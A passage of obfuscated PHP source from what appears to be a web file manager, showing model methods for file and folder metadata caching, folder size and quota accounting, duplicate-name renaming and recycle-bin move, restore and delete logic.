$•ƒç¯é[12]; } $œ¾¯™” = $•ƒç¯é[2162] . $™¬õûÄ[$•ƒç¯é[176]]; if ($™¬õûÄ[$•ƒç¯é[76]] <= 1024 * 10) { $½¶É†Ï = Cache::get($œ¾¯™”); if (!$½¶É†Ï) { $½¶É†Ï = IO::getContent($™¬õûÄ[$•ƒç¯é[84]]); Cache::set($œ¾¯™”, $½¶É†Ï); } return $½¶É†Ï; } if (!$™¬õûÄ[$•ƒç¯é[84]]) { return $•ƒç¯é[12]; } return IO::getContent($™¬õûÄ[$•ƒç¯é[84]]); } public function setDesc($ß¹’ËŒ, $Û…•ç¨) { $´·Úë =& $_SERVER[§ŒØóıü]; Model($´·Úë[561])->eventAddDesc($ß¹’ËŒ, $Û…•ç¨); return $this->metaSet($ß¹’ËŒ, $´·Úë[453], $Û…•ç¨); } public function setContent($úÁ†ïô, $Ìø¶±Ê = '') { $Õ·È Å =& $_SERVER[§ŒØóıü]; $ÁÂ¼×€Ò = $this->sourceInfo($úÁ†ïô); $Æ¼ºíĞ = $this->fileInfoGet($úÁ†ïô); if (!$Æ¼ºíĞ || !$ÁÂ¼×€Ò) { return !1; } $Î…ü„Ò = Model($Õ·È Å[471])->addFileByContent($Ìø¶±Ê, $ÁÂ¼×€Ò[$Õ·È Å[32]]); $¸–Ğï¸õ = $this->fileHistory($ÁÂ¼×€Ò, $Î…ü„Ò[$Õ·È Å[468]], $Î…ü„Ò[$Õ·È Å[76]]); if (!$¸–Ğï¸õ) { return Model($Õ·È Å[471])->remove($Î…ü„Ò[$Õ·È Å[468]]); } $this->folderSizeReset($ÁÂ¼×€Ò[$Õ·È Å[432]]); return !0; } public function fileSubstr($´ıíëÆŸ, $®ò¸ÁÛ¢, $µóã¢¥) { $˜ÒÔÑ‡© = $this->fileInfoGet($´ıíëÆŸ); if (!$˜ÒÔÑ‡©) { return !1; } return IO::fileSubstr($˜ÒÔÑ‡©[$_SERVER[§ŒØóıü][84]], $®ò¸ÁÛ¢, $µóã¢¥); } public function fileInfoGet($ÖŒÔª·Ó) { $Ã¿á¸Ò× =& $_SERVER[§ŒØóıü]; $ùÑ´Ø = $this->sourceInfo($ÖŒÔª·Ó); if (!$ùÑ´Ø || $ùÑ´Ø[$Ã¿á¸Ò×[410]]) { return !1; } $åŸŒ°œÛ = $Ã¿á¸Ò×[474] . $ùÑ´Ø[$Ã¿á¸Ò×[468]]; $Ÿæ’È¯¼ = _get(self::$cacheFileInfo, $åŸŒ°œÛ); if ($Ÿæ’È¯¼) { return $Ÿæ’È¯¼; } $ÉÖúù‚ø = Model($Ã¿á¸Ò×[471])->fileInfo($ùÑ´Ø[$Ã¿á¸Ò×[468]]); if ($ÉÖúù‚ø) { $ÉÖúù‚ø[$Ã¿á¸Ò×[32]] = $ùÑ´Ø[$Ã¿á¸Ò×[32]]; } self::$cacheFileInfo[$åŸŒ°œÛ] = $ÉÖúù‚ø; return $ÉÖúù‚ø; } private function folderChildrenNumber($Ê±ˆßÍ‡) { $°Îø±³ =& $_SERVER[§ŒØóıü]; $ôó©µ³ = $this->sourceInfo($Ê±ˆßÍ‡); $¤‘–ËÈ = array($°Îø±³[580] => array($°Îø±³[540], $ôó©µ³[$°Îø±³[511]] . $Ê±ˆßÍ‡ . $°Îø±³[541]), $°Îø±³[577] => $ôó©µ³[$°Îø±³[496]], $°Îø±³[430] => intval($ôó©µ³[$°Îø±³[431]]), $°Îø±³[574] => 1); $ÕŞ¥ıí = $this->where($¤‘–ËÈ)->count(); $¢ÁóéèÎ = $this->where($¤‘–ËÈ)->where(array($°Îø±³[574] => 0))->count(); return array($°Îø±³[80] => $¢ÁóéèÎ, $°Îø±³[81] => $ÕŞ¥ıí); } public function pathInfo($‘ëûõ¹Ş, $ôõÆĞå = false) { $â¬í§İ¶ =& $_SERVER[§ŒØóıü]; $ôõÆĞå = !1; $‘ëûõ¹Ş = intval($‘ëûõ¹Ş); $†—´¤Å… = $â¬í§İ¶[461] . intval($ôõÆĞå) . $â¬í§İ¶[386] . $‘ëûõ¹Ş; $¼¥¶­’ = _get(self::$cachePathInfo, $†—´¤Å…); if ($¼¥¶­’) { return $¼¥¶­’; } $¯İ¥„É = $this->sourceInfo($‘ëûõ¹Ş); if (!$¯İ¥„É) { return !1; } $¯İ¥„É = $this->_listDataApplyItem($¯İ¥„É, $ôõÆĞå); self::$cachePathInfo[$†—´¤Å…] = $¯İ¥„É; return $¯İ¥„É; } public static $cachePathInfoMore = array(); public function pathInfoMore($¼°÷Òğ“) { $Üîü°¾â =& $_SERVER[§ŒØóıü]; $Áë—ë­ä = _get(self::$cachePathInfoMore, $¼°÷Òğ“); if ($Áë—ë­ä) { return $Áë—ë­ä; } $™§¿µ•È = $this->pathInfo($¼°÷Òğ“); if (!$™§¿µ•È) { return !1; } if ($™§¿µ•È[$Üîü°¾â[410]] == $Üîü°¾â[88]) { $™§¿µ•È[$Üîü°¾â[79]] = $this->folderChildrenNumber($¼°÷Òğ“); } self::$cachePathInfoMore[$¼°÷Òğ“] = $™§¿µ•È; return $™§¿µ•È; } public function sourceInfo($Ê’Ï›ªÇ) { $¯ÄÚâÆ =& $_SERVER[§ŒØóıü]; if (!$Ê’Ï›ªÇ) { return array(); } $Ê’Ï›ªÇ = intval($Ê’Ï›ªÇ); $´ÏÔ’Ú® = $¯ÄÚâÆ[460] . $Ê’Ï›ªÇ; $ƒš¸Íİ = _get(self::$cacheSourceInfo, $´ÏÔ’Ú®); if ($ƒš¸Íİ) { return $ƒš¸Íİ; } $¨ÄõÒ®• = $this->where(array($¯ÄÚâÆ[402] => $Ê’Ï›ªÇ))->find(); self::$cacheSourceInfo[$´ÏÔ’Ú®] = $¨ÄõÒ®•; return self::$cacheSourceInfo[$´ÏÔ’Ú®]; } public function sourceCacheClear($ÆèÏ±ÜŠ = false) { self::cacheClear($ÆèÏ±ÜŠ); } public static function cacheClear($ë›òí·÷ = false) { $íˆÏ¦®¼ =& $_SERVER[§ŒØóıü]; if ($ë›òí·÷ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$íˆÏ¦®¼[460] . $ë›òí·÷]); unset(self::$cachePathInfoMore[$ë›òí·÷]); unset(self::$cachePathInfo[$íˆÏ¦®¼[2163] . $ë›òí·÷]); unset(self::$cachePathInfo[$íˆÏ¦®¼[2164] . $ë›òí·÷]); } public function metaSet($‡â‡˜œÕ, $è»áö¯­ = null, $ÆÀœ‹ü† = null) { $Î¾Å¬Š© = parent::metaSet($‡â‡˜œÕ, $è»áö¯­, $ÆÀœ‹ü†); if ($Î¾Å¬Š©) { $this->sourceCacheClear($‡â‡˜œÕ); } return $Î¾Å¬Š©; } public function pathInfoByPath($Åú°çæ, $šï¨ıƒ) { $äßÂ‚Á¾ =& $_SERVER[§ŒØóıü]; $®Ë“Ï› = !$šï¨ıƒ ? array() : explode($äßÂ‚Á¾[8], trim($šï¨ıƒ, $äßÂ‚Á¾[8])); $¼ëÇ†¸È = $Åú°çæ; foreach ($®Ë“Ï› as $áÕäø‰³) { $æ™·˜š× = array($äßÂ‚Á¾[432] => $¼ëÇ†¸È, $äßÂ‚Á¾[32] => $áÕäø‰³); $şú”Ç“ş = $this->where($æ™·˜š×)->select(); if (!$şú”Ç“ş) { return !1; } $şú”Ç“ş = array_sort_by($şú”Ç“ş, $äßÂ‚Á¾[431]); $¼ëÇ†¸È = $şú”Ç“ş[0][$äßÂ‚Á¾[402]]; } return $this->pathInfo($¼ëÇ†¸È, !0); } protected function updateModifyTime($¢­˜¯Å) { $µŒ”ü½Å =& $_SERVER[§ŒØóıü]; if (!$¢­˜¯Å) { return; } if (!is_array($¢­˜¯Å)) { $¢­˜¯Å = array($¢­˜¯Å); } foreach ($¢­˜¯Å as $¬ÎÉ ¤¤ => $À½ù €ç) { $¢­˜¯Å[$¬ÎÉ ¤¤] = intval($À½ù €ç); $this->sourceCacheClear($À½ù €ç); } $ñøšœ„º = array($µŒ”ü½Å[402] => array($µŒ”ü½Å[7], $¢­˜¯Å)); $á·îéŞĞ = array($µŒ”ü½Å[579] => USER_ID, $µŒ”ü½Å[424] => time()); $this->where($ñøšœ„º)->save($á·îéŞĞ); } public function folderSizeReset($¢êÄìí, $ŸŒ¡›±  = false) { $¤›´˜Ô =& $_SERVER[§ŒØóıü]; if ($this->statusIgnoreResetSpace) { return; } $Ñ³ü‡£ì = $this->sourceInfo($¢êÄìí); $ÖûÊÓÌĞ = $¤›´˜Ô[2165] . $¢êÄìí; CacheLock::lock($ÖûÊÓÌĞ, 20); if ($ŸŒ¡›±  === !1) { $this->sourceCacheClear($¢êÄìí); $Ñ³ü‡£ì = $this->sourceInfo($¢êÄìí); $¾Â¶„·ï = array($¤›´˜Ô[401] => $¢êÄìí, $¤›´˜Ô[430] => 0); $–æúÅ²  = $this->where($¾Â¶„·ï)->sum($¤›´˜Ô[76]); $ŸŒ¡›±  = intval($–æúÅ² ) - intval($Ñ³ü‡£ì[$¤›´˜Ô[76]]); } if ($ŸŒ¡›±  == 0) { return CacheLock::unlock($ÖûÊÓÌĞ); } $Ş¨òäƒ£ = $this->parentLevelArray($Ñ³ü‡£ì[$¤›´˜Ô[511]]); if (!$Ş¨òäƒ£) { $Ş¨òäƒ£ = array(); } $Ş¨òäƒ£[] = $Ñ³ü‡£ì[$¤›´˜Ô[402]]; $¾Â¶„·ï = array($¤›´˜Ô[402] => array($¤›´˜Ô[418], $Ş¨òäƒ£)); if ($ŸŒ¡›±  < 0) { $¾Â¶„·ï[$¤›´˜Ô[76]] = array($¤›´˜Ô[1021], abs($ŸŒ¡›± )); } $this->where($¾Â¶„·ï)->setAdd($¤›´˜Ô[76], $ŸŒ¡›± ); CacheLock::unlock($ÖûÊÓÌĞ); $Ï¬ˆ˜Şâ = $¤›´˜Ô[2166] . $Ñ³ü‡£ì[$¤›´˜Ô[411]] . $¤›´˜Ô[4] . $Ñ³ü‡£ì[$¤›´˜Ô[496]]; $³³ŞÈ° = array($Ñ³ü‡£ì[$¤›´˜Ô[411]], $Ñ³ü‡£ì[$¤›´˜Ô[496]]); TaskRun::timeLimitCall($Ï¬ˆ˜Şâ, $¤›´˜Ô[2167], $³³ŞÈ°, 1.5); } public function folderSizeResetChildren($‚šé¶) { $Õïµ¢ô =& $_SERVER[§ŒØóıü]; $this->sourceCacheClear($‚šé¶); $“Ô‘¸Î÷ = $this->sourceInfo($‚šé¶); $Õùí¹Ò› = array($Õïµ¢ô[574] => 1, $Õïµ¢ô[577] => $“Ô‘¸Î÷[$Õïµ¢ô[496]], $Õïµ¢ô[580] => array($Õïµ¢ô[540], $“Ô‘¸Î÷[$Õïµ¢ô[511]] . $‚šé¶ . $Õïµ¢ô[541])); $óç³æİ³ = $Õïµ¢ô[2168]; $Üö¯¢³ã = $this->field($óç³æİ³)->where($Õùí¹Ò›)->select(); $Õùí¹Ò›[$Õïµ¢ô[410]] = 0; $ËÊ¬²‰™ = $this->field($óç³æİ³)->where($Õùí¹Ò›)->select(); if (!$ËÊ¬²‰™) { return; } $Üö¯¢³ã[] = $“Ô‘¸Î÷; $Üö¯¢³ã = array_to_keyvalue($Üö¯¢³ã, $Õïµ¢ô[402]); foreach ($Üö¯¢³ã as $›»¥Ò³Å => $ ÷®¹™Ñ) { $Üö¯¢³ã[$›»¥Ò³Å][$Õïµ¢ô[2169]] = $Üö¯¢³ã[$›»¥Ò³Å][$Õïµ¢ô[76]]; $Üö¯¢³ã[$›»¥Ò³Å][$Õïµ¢ô[76]] = 0; } foreach ($ËÊ¬²‰™ as $ ÷®¹™Ñ) { $ñÅÆòßğ = $ ÷®¹™Ñ[$Õïµ¢ô[432]] . $Õïµ¢ô[12]; if (!isset($Üö¯¢³ã[$ñÅÆòßğ])) { continue; } if ($ ÷®¹™Ñ[$Õïµ¢ô[431]] == $Üö¯¢³ã[$ñÅÆòßğ][$Õïµ¢ô[431]]) { $Üö¯¢³ã[$ñÅÆòßğ][$Õïµ¢ô[76]] += $ ÷®¹™Ñ[$Õïµ¢ô[76]]; } } foreach ($Üö¯¢³ã as $ ÷®¹™Ñ) { $ÆäÆêÎ = $this->parentLevelArray($ ÷®¹™Ñ[$Õïµ¢ô[511]]); foreach ($ÆäÆêÎ as $ñÅÆòßğ) { $ñÅÆòßğ = $ñÅÆòßğ . $Õïµ¢ô[12]; if (!isset($Üö¯¢³ã[$ñÅÆòßğ])) { continue; } if ($ ÷®¹™Ñ[$Õïµ¢ô[431]] == $Üö¯¢³ã[$ñÅÆòßğ][$Õïµ¢ô[431]]) { $Üö¯¢³ã[$ñÅÆòßğ][$Õïµ¢ô[76]] += $ ÷®¹™Ñ[$Õïµ¢ô[76]]; } } } $ıñœ•Æ¯ = array(); foreach ($Üö¯¢³ã as $ ÷®¹™Ñ) { if ($ ÷®¹™Ñ[$Õïµ¢ô[76]] == $ ÷®¹™Ñ[$Õïµ¢ô[2169]]) { continue; } $ıñœ•Æ¯[] = array($Õïµ¢ô[402], $ ÷®¹™Ñ[$Õïµ¢ô[402]], $Õïµ¢ô[76], $ ÷®¹™Ñ[$Õïµ¢ô[76]]); } $this->saveAll($ıñœ•Æ¯); } public function userSpaceReset($ƒºÇİõÆ = false) { $“ÌİÜ¨ı =& $_SERVER[§ŒØóıü]; $‚ÁÊ®à• = $this->where(array($“ÌİÜ¨ı[411] => self::TYPE_USER, $“ÌİÜ¨ı[496] => $ƒºÇİõÆ, $“ÌİÜ¨ı[410] => 0))->sum($“ÌİÜ¨ı[76]); $‚ÁÊ®à• = !$‚ÁÊ®à• || $‚ÁÊ®à• <= 0 ? 0 : $‚ÁÊ®à•; Model($“ÌİÜ¨ı[504])->userEdit($ƒºÇİõÆ, array($“ÌİÜ¨ı[1851] => $‚ÁÊ®à•)); } public function targetSpaceUpdate($±éåõ³Á, $Ÿ÷¥‘Ñ£) { $–½ó„‚è =& $_SERVER[§ŒØóıü]; if (!$Ÿ÷¥‘Ñ£) { return; } if (!in_array($±éåõ³Á, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ê£òÔı = $this->targetSpaceSize($±éåõ³Á, $Ÿ÷¥‘Ñ£); if ($±éåõ³Á == self::TYPE_USER) { Model($–½ó„‚è[504])->userEdit($Ÿ÷¥‘Ñ£, array($–½ó„‚è[1851] => $Ê£òÔı)); } else { if ($±éåõ³Á == self::TYPE_GROUP) { Model($–½ó„‚è[512])->groupEdit($Ÿ÷¥‘Ñ£, array($–½ó„‚è[1851] => $Ê£òÔı)); } } } public function targetSpaceSize($†ù•²‡ò, $ã–İçíÛ) { $šÜÆÚ§è =& $_SERVER[§ŒØóıü]; $§¦Œú›» = 0; $àÇİ¡Í  = $this->targetSourceRoot($†ù•²‡ò, $ã–İçíÛ, !0); foreach ($àÇİ¡Í  as $Ö¬…ÑÈ) { if (!$Ö¬…ÑÈ) { continue; } $§¦Œú›» += floatval($Ö¬…ÑÈ[$šÜÆÚ§è[76]]); $ÖÍÎøìŸ = array($šÜÆÚ§è[580] => array($šÜÆÚ§è[540], $šÜÆÚ§è[521] . $Ö¬…ÑÈ[$šÜÆÚ§è[402]] . $šÜÆÚ§è[541])); $½Í¾èÇ = Model($šÜÆÚ§è[429])->field($šÜÆÚ§è[417])->where($ÖÍÎøìŸ)->select(); $½Í¾èÇ = array_to_keyvalue($½Í¾èÇ, $šÜÆÚ§è[12], $šÜÆÚ§è[402]); $½Í¾èÇ = array_unique(array_filter($½Í¾èÇ)); if ($½Í¾èÇ) { $ÖÍÎøìŸ = array($šÜÆÚ§è[417] => array($šÜÆÚ§è[418], $½Í¾èÇ)); $§¦Œú›» += floatval($this->where($ÖÍÎøìŸ)->sum($šÜÆÚ§è[76])); } } $§¦Œú›» = !$§¦Œú›» || $§¦Œú›» <= 0 ? 0 : $§¦Œú›»; return $§¦Œú›»; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ì–œšš†) { return $this->fileTypeProfile($ì–œšš†, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¿Œ‡åŒ€) { return $this->fileTypeProfile($¿Œ‡åŒ€, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ˆğÃç‹, $‰ÏãÒÏ‡) { $Ñ³ÏüòÖ =& $_SERVER[§ŒØóıü]; $’‰Íë = $Ñ³ÏüòÖ[2170] . $ˆğÃç‹ . $Ñ³ÏüòÖ[11] . $‰ÏãÒÏ‡; $“»§û–­ = Cache::get($’‰Íë); if ($“»§û–­) { return $“»§û–­; } $½‹™æü = array($Ñ³ÏüòÖ[574] => 0); if ($ˆğÃç‹ != !1) { $½‹™æü[$Ñ³ÏüòÖ[496]] = $ˆğÃç‹; $½‹™æü[$Ñ³ÏüòÖ[411]] = $‰ÏãÒÏ‡; } $¦‡Í­î· = array(); $¦‡Í­î·[$Ñ³ÏüòÖ[2171]] = array($Ñ³ÏüòÖ[2172] => LNG($Ñ³ÏüòÖ[2171]), $Ñ³ÏüòÖ[2173] => $this->where($½‹™æü)->count(), $Ñ³ÏüòÖ[545] => $this->where($½‹™æü)->sum($Ñ³ÏüòÖ[76])); $øêêúÍÌ = KodIO::fileTypeList(); foreach ($øêêúÍÌ as $¿º¤ã›Ú => $Ñ²ªÜµ£) { $½‹™æü[$Ñ³ÏüòÖ[412]] = $this->fileTypeWhere($¿º¤ã›Ú); $¦‡Í­î·[$¿º¤ã›Ú] = array($Ñ³ÏüòÖ[2172] => $Ñ²ªÜµ£[$Ñ³ÏüòÖ[32]], $Ñ³ÏüòÖ[2173] => $this->where($½‹™æü)->count(), $Ñ³ÏüòÖ[545] => $this->where($½‹™æü)->sum($Ñ³ÏüòÖ[76])); } Cache::set($’‰Íë, $¦‡Í­î·, 1200); return $¦‡Í­î·; } public function fileNameExist($Œ©ë•åµ, $ÂˆÜµâû) { $ÈØ‡¡ÈÙ =& $_SERVER[§ŒØóıü]; $ÃÃè­ÍÎ = $this->where(array($ÈØ‡¡ÈÙ[432] => $Œ©ë•åµ, $ÈØ‡¡ÈÙ[32] => $ÂˆÜµâû, $ÈØ‡¡ÈÙ[431] => 0))->find(); return is_array($ÃÃè­ÍÎ) ? $ÃÃè­ÍÎ[$ÈØ‡¡ÈÙ[402]] : !1; } public function childList($‹Ñ÷¿î) { $Ô†§ÕôÅ =& $_SERVER[§ŒØóıü]; $¢…â¢“á = $Ô†§ÕôÅ[2148] . $‹Ñ÷¿î; if (isset(self::$cacheChildList[$¢…â¢“á])) { return self::$cacheChildList[$¢…â¢“á]; } $Ø¡óÍ–“ = array($Ô†§ÕôÅ[432] => intval($‹Ñ÷¿î), $Ô†§ÕôÅ[431] => 0); $Ğ£ıÌ‹ = $this->where($Ø¡óÍ–“)->select(); $Ğ£ıÌ‹ = $Ğ£ıÌ‹ ? $Ğ£ıÌ‹ : array(); self::$cacheChildList[$¢…â¢“á] = $Ğ£ıÌ‹; foreach ($Ğ£ıÌ‹ as $ğ‘â„Ï“) { $¢…â¢“á = $Ô†§ÕôÅ[460] . $ğ‘â„Ï“[$Ô†§ÕôÅ[402]]; self::$cacheSourceInfo[$¢…â¢“á] = $ğ‘â„Ï“; } return $Ğ£ıÌ‹; } public function fileNameAuto($¨°æğĞ×, $šÇü§Ç, $Ş¯øˆµ¦ = REPEAT_RENAME, $ªÂ•ñõô = false) { $ÑÑøÈÊÖ =& $_SERVER[§ŒØóıü]; $Ï“Æôéˆ = get_path_ext($šÇü§Ç); $Æ”§ë„ª = $Ï“Æôéˆ ? basename($šÇü§Ç, $ÑÑøÈÊÖ[10] . $Ï“Æôéˆ) . $ÑÑøÈÊÖ[2174] . $Ï“Æôéˆ : $šÇü§Ç . $ÑÑøÈÊÖ[384]; $”’û§™ = array($ÑÑøÈÊÖ[432] => $¨°æğĞ×, $ÑÑøÈÊÖ[431] => 0, $ÑÑøÈÊÖ[32] => array($ÑÑøÈÊÖ[383], $Æ”§ë„ª)); $ÖÀ›ó®™ = $this->field($ÑÑøÈÊÖ[32])->where($”’û§™)->select(); $·ŞÔ†ëµ = array_to_keyvalue($ÖÀ›ó®™, $ÑÑøÈÊÖ[12], $ÑÑøÈÊÖ[32]); return $this->fileNameAutoGet($·ŞÔ†ëµ, $šÇü§Ç, $Ş¯øˆµ¦, $ªÂ•ñõô); } public function fileNameAutoGet($¾ƒÕ©Éï, $×‚•¡áº, $´éÊ¬º, $ª÷¤º‚–) { $­ú©Å•è =& $_SERVER[§ŒØóıü]; if ($´éÊ¬º == REPEAT_REPLACE || !$¾ƒÕ©Éï || !in_array_not_case($×‚•¡áº, $¾ƒÕ©Éï) || $ª÷¤º‚– && $´éÊ¬º != REPEAT_RENAME_FOLDER) { return $×‚•¡áº; } if ($´éÊ¬º == REPEAT_SKIP) { return !1; } $‚×ÑÅ·À = $­ú©Å•è[10] . get_path_ext($×‚•¡áº); $‚×ÑÅ·À = $‚×ÑÅ·À == $­ú©Å•è[10] || $ª÷¤º‚– ? $­ú©Å•è[12] : $‚×ÑÅ·À; for ($óÌŸˆ™ = 1; $óÌŸˆ™ <= count($¾ƒÕ©Éï) + 1; $óÌŸˆ™++) { $…°Ó©‰ = substr($×‚•¡áº, 0, strlen($×‚•¡áº) - strlen($‚×ÑÅ·À)); $×ëÎ˜‡€ = $…°Ó©‰ . "\x28{$óÌŸˆ™}\51{$‚×ÑÅ·À}"; if (!in_array_not_case($×ëÎ˜‡€, $¾ƒÕ©Éï)) { return $×ëÎ˜‡€; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65\x5f\x72\145\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\155\x65", "\x74\151\155\145", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\x63\x74\151\157\x6e")); public function listData($¸Á Å²Á = false) { $·€±‹â =& $_SERVER[§ŒØóıü]; $¸Á Å²Á = $¸Á Å²Á ? $¸Á Å²Á : USER_ID; $óğ‰Ü¨ì = $this->where(array($·€±‹â[1664] => $¸Á Å²Á))->select(); return array_to_keyvalue($óğ‰Ü¨ì, $·€±‹â[12], $·€±‹â[402]); } public function moveToRecycle($ÏÒŒæ•¬) { $¶éø÷Ã =& $_SERVER[§ŒØóıü]; $ø€Œ¾Òø = Model($¶éø÷Ã[1345]); $Ïô†òÓô = $ø€Œ¾Òø->sourceInfo($ÏÒŒæ•¬); if (!$Ïô†òÓô || $Ïô†òÓô[$¶éø÷Ã[431]] == $¶éø÷Ã[88]) { return; } $ªÍƒù¥Ğ = array($¶éø÷Ã[417] => $ÏÒŒæ•¬, $¶éø÷Ã[1664] => USER_ID, $¶éø÷Ã[576] => $Ïô†òÓô[$¶éø÷Ã[411]], $¶éø÷Ã[577] => $Ïô†òÓô[$¶éø÷Ã[496]], $¶éø÷Ã[580] => $Ïô†òÓô[$¶éø÷Ã[511]]); $this->add($ªÍƒù¥Ğ); $this->recycleMove($ÏÒŒæ•¬, 1); if ($Ïô†òÓô[$¶éø÷Ã[410]] == $¶éø÷Ã[88]) { $Ú’÷£Ÿ  = array($¶éø÷Ã[580] => array($¶éø÷Ã[540], $Ïô†òÓô[$¶éø÷Ã[511]] . $ÏÒŒæ•¬ . $¶éø÷Ã[541])); $ø€Œ¾Òø->where($Ú’÷£Ÿ )->setField($¶éø÷Ã[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ ïÛ¹Õ» = false, $÷Ş”Œ« = false) { $­Æá—ƒ÷ =& $_SERVER[§ŒØóıü]; $÷Ş”Œ« = $÷Ş”Œ« ? $÷Ş”Œ« : USER_ID; $¶åëÕ¥È = Model($­Æá—ƒ÷[1345]); $ÈÉÇŸŠ¡ = $this->listData($÷Ş”Œ«); $ ïÛ¹Õ» = $ ïÛ¹Õ» === !1 ? !1 : $ ïÛ¹Õ»; $ÏäĞ¶» = array(); foreach ($ÈÉÇŸŠ¡ as $ãíó¦¾Ó) { if ($ ïÛ¹Õ» != !1 && !in_array($ãíó¦¾Ó, $ ïÛ¹Õ»)) { continue; } $‰û¡ïşÖ = $¶åëÕ¥È->sourceInfo($ãíó¦¾Ó); $¶åëÕ¥È->remove($ãíó¦¾Ó, !1); $ñ½ñŞ”Â = $‰û¡ïşÖ[$­Æá—ƒ÷[411]] . $­Æá—ƒ÷[11] . $‰û¡ïşÖ[$­Æá—ƒ÷[496]]; $ÏäĞ¶»[$ñ½ñŞ”Â] = array($­Æá—ƒ÷[576] => $‰û¡ïşÖ[$­Æá—ƒ÷[411]], $­Æá—ƒ÷[496] => $‰û¡ïşÖ[$­Æá—ƒ÷[496]]); $this->where(array($­Æá—ƒ÷[402] => $ãíó¦¾Ó))->delete(); } foreach ($ÏäĞ¶» as $Á°µñ¶¦) { $¶åëÕ¥È->targetSpaceUpdate($Á°µñ¶¦[$­Æá—ƒ÷[411]], $Á°µñ¶¦[$­Æá—ƒ÷[496]]); } } public function restore($ÂÁË§îÚ = false) { $Á¡è¾êñ = $this->listData(); $this->_restoreSource($Á¡è¾êñ, $ÂÁË§îÚ); } public function removeUserAll($ËöşñÛ¨) { $this->remove(!1, $ËöşñÛ¨); } private function _restoreSource($Á¥³×ë, $†Î‹ñß) { $İèŒí¸Â =& $_SERVER[§ŒØóıü]; $Ôä™û¼ğ = Model($İèŒí¸Â[1345]); $†Î‹ñß = $†Î‹ñß == !1 ? !1 : $†Î‹ñß; if (!$Á¥³×ë) { return !0; } $“í­õÂ = array(); foreach ($Á¥³×ë as $™…‘¡Ã‹) { if ($†Î‹ñß != !1 && !in_array($™…‘¡Ã‹, $†Î‹ñß)) { continue; } $…¨ß®şô = $Ôä™û¼ğ->sourceInfo($™…‘¡Ã‹); $‹î×ßµâ = $Ôä™û¼ğ->sourceInfo($…¨ß®şô[$İèŒí¸Â[432]]); if ($‹î×ßµâ[$İèŒí¸Â[431]] == $İèŒí¸Â[88]) { continue; } $Ôä™û¼ğ->lockMoveStart($™…‘¡Ã‹); $this->recycleMove($™…‘¡Ã‹, 0); if ($…¨ß®şô[$İèŒí¸Â[410]] == $İèŒí¸Â[88]) { $èîÁÈÌµ = array($İèŒí¸Â[580] => array($İèŒí¸Â[540], $…¨ß®şô[$İèŒí¸Â[511]] . $™…‘¡Ã‹ . $İèŒí¸Â[541])); $Ôä™û¼ğ->where($èîÁÈÌµ)->setField($İèŒí¸Â[431], 0); $this->restoreFolderChildren($™…‘¡Ã‹, $Á¥³×ë); } $this->where(array($İèŒí¸Â[402] => $™…‘¡Ã‹))->delete(); $Ôä™û¼ğ->folderSizeReset($…¨ß®şô[$İèŒí¸Â[432]]); $“í­õÂ[] = $…¨ß®şô[$İèŒí¸Â[432]]; if ($…¨ß®şô[$İèŒí¸Â[410]] == $İèŒí¸Â[88]) { $“í­õÂ[] = $™…‘¡Ã‹; } $Ôä™û¼ğ->lockMoveEnd($™…‘¡Ã‹); } $Ôä™û¼ğ->updateModifyTime($“í­õÂ); } private function restoreFolderChildren($÷î·ªÕò, $İ”Å“û) { $ ¸úèò =& $_SERVER[§ŒØóıü]; $ûô²”ì = Model($ ¸úèò[1345]); $¿£òœ™‚ = array($ ¸úèò[402] => array($ ¸úèò[7], array())); foreach ($İ”Å“û as $Ö “”Äâ) { if ($Ö “”Äâ == $÷î·ªÕò) { continue; } if (!$ûô²”ì->isParentOf($÷î·ªÕò, $Ö “”Äâ)) { continue; } $Ÿ“åŠ–Í = $ûô²”ì->sourceInfo($Ö “”Äâ); if ($Ÿ“åŠ–Í[$ ¸úèò[410]] == $ ¸úèò[88]) { $¿£òœ™‚[] = array($ ¸úèò[580] => array($ ¸úèò[540], $Ÿ“åŠ–Í[$ ¸úèò[511]] . $Ö “”Äâ . $ ¸úèò[541])); } else { $¿£òœ™‚[$ ¸úèò[402]][1][] = $Ö “”Äâ; } } if (!$¿£òœ™‚[$ ¸úèò[402]][1]) { unset($¿£òœ™‚[$ ¸úèò[402]]); } if (!$¿£òœ™‚) { return; } $¿£òœ™‚[$ ¸úèò[402]][1] = array_unique($¿£òœ™‚[$ ¸úèò[402]][1]); $¿£òœ™‚[$ ¸úèò[1006]] = $ ¸úèò[1960]; $ûô²”ì->where($¿£òœ™‚)->setField($ ¸úèò[431], 1); } private function recycleMove($öíœ·ïğ, $‹ØşœáÀ = 1) { $ÔŸ®íÕé =& $_SERVER[§ŒØóıü]; $¡Ç¥‚Ù = Model($ÔŸ®íÕé[1345]); $ªù„ÕâÑ = Model($ÔŸ®íÕé[2175]); $°»™ßé¢ = array($ÔŸ®íÕé[402] => $öíœ·ïğ); if ($‹ØşœáÀ) { $¡Ç¥‚Ù->where($°»™ßé¢)->setField($ÔŸ®íÕé[431], 1); $ªù„ÕâÑ->eventRecycle($öíœ·ïğ, $ÔŸ®íÕé[2176]); } else { $ùëæßÖÕ = $¡Ç¥‚Ù->where($°»™ßé¢)->find(); $¤¼À¯¶Í = $ùëæßÖÕ[$ÔŸ®íÕé[410]] == $ÔŸ®íÕé[88]; $²Å®ªÔÊ = $¡Ç¥‚Ù->fileNameAuto($ùëæßÖÕ[$ÔŸ®íÕé[432]], $ùëæßÖÕ[$ÔŸ®íÕé[32]], REPEAT_RENAME_FOLDER, $¤¼À¯¶Í); if ($²Å®ªÔÊ != $ùëæßÖÕ[$ÔŸ®íÕé[32]]) { $¡Ç¥‚Ù->rename($öíœ·ïğ, $²Å®ªÔÊ); } $¡Ç¥‚Ù->where($°»™ßé¢)->setField($ÔŸ®íÕé[431], 0); $ªù„ÕâÑ->eventRecycle($öíœ·ïğ, $ÔŸ®íÕé[2177]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = 